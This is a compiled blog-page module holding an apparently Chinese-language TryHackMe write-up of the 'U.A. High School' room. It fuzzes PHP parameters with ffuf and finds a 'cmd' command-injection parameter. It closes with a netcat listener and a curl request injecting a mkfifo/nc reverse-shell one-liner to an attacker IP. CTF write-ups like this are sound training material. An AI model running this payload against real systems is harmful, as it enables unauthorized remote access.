import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as i,b as t,o as a}from"./app-P60k8rYM.js";const l={};function n(r,e){return a(),i("div",null,e[0]||(e[0]=[t('<h2 id="解题过程" tabindex="-1"><a class="header-anchor" href="#解题过程"><span>解题过程</span></a></h2><p>端口扫描和网站爆破之后没有发现可以利用的点<br> 但是在<a href="http://10.10.74.25/assets/images%E7%9A%84%E5%93%8D%E5%BA%94%E5%BE%88%E6%9C%89%E8%B6%A3" target="_blank" rel="noopener noreferrer">http://10.10.74.25/assets/images的响应很有趣</a><br><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250507213758.png" alt="image.png" loading="lazy"></p><p>证明了网页的存在，当访问<a href="http://10.10.36.251/assets/%E6%97%B6%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E8%AE%BE%E7%BD%AE%E4%BA%86%60session%60%E8%BF%99%E6%84%8F%E5%91%B3%E7%9D%80%E6%88%91%E4%BB%AC%E5%BE%88%E5%8F%AF%E8%83%BD%E8%AE%BF%E9%97%AE%E4%BA%86%E6%9F%90%E4%B8%AAphp%E6%96%87%E4%BB%B6" target="_blank" rel="noopener noreferrer">http://10.10.36.251/assets/时，我们可以发现设置了`session`这意味着我们很可能访问了某个php文件</a></p><p>发现是个php文件后就有了一点操作空间，可以用模糊测试对php的参数进行碰撞<br> 构造命令进行碰撞</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ffuf</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;http://10.10.85.228/assets/index.php?FUZZ=id&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -mc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> all</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -ic</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -t</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 100</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -fs</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><ol><li>​<strong>​<code>-u &#39;http://10.10.85.228/assets/index.php?FUZZ=id&#39;</code>​</strong>​ <ul><li>​<strong>​作用​</strong>​：指定目标 URL，<code>FUZZ</code> 是占位符，表示此处会被字典中的词替换。</li><li>​<strong>​示例​</strong>​：若字典中有词 <code>user</code>，则实际请求为 <code>http://.../index.php?user=id</code>。</li></ul></li><li>​<strong>​<code>-mc all</code>​</strong>​ <ul><li>​<strong>​作用​</strong>​：匹配所有 HTTP 状态码（<code>-mc</code> 表示 &quot;match HTTP status code&quot;）。</li><li>​<strong>​注意​</strong>​：默认情况下，<code>ffuf</code> 仅显示状态码为 200、204、301 等的响应。使用 <code>all</code> 会显示所有状态码的响应（可能包含误报）。</li></ul></li><li>​<strong>​<code>-ic</code>​</strong>​ <ul><li>​<strong>​作用​</strong>​：忽略响应中的 HTML 注释（<code>ignore comments</code>），避免因注释内容干扰结果判断。</li></ul></li><li>​<strong>​<code>-t 100</code>​</strong>​ <ul><li>​<strong>​作用​</strong>​：设置并发线程数为 100，提高扫描速度。</li></ul></li><li>​<strong>​<code>-w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt</code>​</strong>​ <ul><li>​<strong>​作用​</strong>​：指定用于替换 <code>FUZZ</code> 的字典文件路径（常见 Web 参数名的小写单词列表）。</li></ul></li><li>​<strong>​<code>-fs 0</code>​</strong>​ <ul><li>​<strong>​作用​</strong>​：过滤（不显示）响应体大小为 0 的结果（<code>fs</code> 表示 &quot;filter response size&quot;）。</li><li>​<strong>​意图​</strong>​：排除无实际内容的响应（如空页面或错误响应）。<br><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508192204.png" alt="image.png" loading="lazy"></li></ul></li></ol><p>搜索到参数<code>cmd</code><br> 似乎时RCE漏洞，试试看<br><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508192422.png" alt="image.png" loading="lazy"><br> 似乎是base64加密<br> 解一下码看看<br><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508194401.png" alt="image.png" loading="lazy"><br> 接下来高端操作来了</p><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell"><span>反弹shell</span></a></h3><p>首先监听反射端口</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">nc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -lvnp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1232</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>然后构造命令</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;http://10.10.38.88/assets/index.php&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -G</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --data-urlencode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.50.132 1232 &gt;/tmp/f&#39;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div>',12)]))}const o=s(l,[["render",n],["__file","U.A. High School.html.vue"]]),g=JSON.parse('{"path":"/article/01_%E9%A1%B9%E7%9B%AE/THM/U.A.%20High%20School.html","title":"U.A. High School","lang":"zh-CN","frontmatter":{"icon":"pen-to-square","date":"2025-05-07T00:00:00.000Z","tags":null,"title":"U.A. High School","category":["项目"],"description":"解题过程 端口扫描和网站爆破之后没有发现可以利用的点 但是在http://10.10.74.25/assets/images的响应很有趣 image.png 证明了网页的存在，当访问http://10.10.36.251/assets/时，我们可以发现设置了`session`这意味着我们很可能访问了某个php文件 发现是个php文件后就有了一点操作空间...","head":[["meta",{"property":"og:url","content":"https://github.com/fakeppa/fakeppa.github.io/article/01_%E9%A1%B9%E7%9B%AE/THM/U.A.%20High%20School.html"}],["meta",{"property":"og:site_name","content":"问己"}],["meta",{"property":"og:title","content":"U.A. High School"}],["meta",{"property":"og:description","content":"解题过程 端口扫描和网站爆破之后没有发现可以利用的点 但是在http://10.10.74.25/assets/images的响应很有趣 image.png 证明了网页的存在，当访问http://10.10.36.251/assets/时，我们可以发现设置了`session`这意味着我们很可能访问了某个php文件 发现是个php文件后就有了一点操作空间..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250507213758.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-05-08T12:48:42.000Z"}],["meta",{"property":"article:published_time","content":"2025-05-07T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-05-08T12:48:42.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"U.A. High School\\",\\"image\\":[\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250507213758.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508192204.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508192422.png\\",\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508194401.png\\"],\\"datePublished\\":\\"2025-05-07T00:00:00.000Z\\",\\"dateModified\\":\\"2025-05-08T12:48:42.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fakeppa\\",\\"url\\":\\"https://github.com/fakeppa/fakeppa.github.io\\"}]}"]]},"headers":[{"level":2,"title":"解题过程","slug":"解题过程","link":"#解题过程","children":[{"level":3,"title":"反弹shell","slug":"反弹shell","link":"#反弹shell","children":[]}]}],"git":{"createdTime":1746703445000,"updatedTime":1746708522000,"contributors":[{"name":"fakeppa","username":"fakeppa","email":"l17091799155@qq.com","commits":6,"url":"https://github.com/fakeppa"}]},"readingTime":{"minutes":1.64,"words":493},"filePathRelative":"article/01_项目/THM/U.A. High School.md","localizedDate":"2025年5月7日","excerpt":"<h2>解题过程</h2>\\n<p>端口扫描和网站爆破之后没有发现可以利用的点<br>\\n但是在<a href=\\"http://10.10.74.25/assets/images%E7%9A%84%E5%93%8D%E5%BA%94%E5%BE%88%E6%9C%89%E8%B6%A3\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">http://10.10.74.25/assets/images的响应很有趣</a><br>\\n<img src=\\"https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250507213758.png\\" alt=\\"image.png\\" loading=\\"lazy\\"></p>","autoDesc":true}');export{o as comp,g as data};
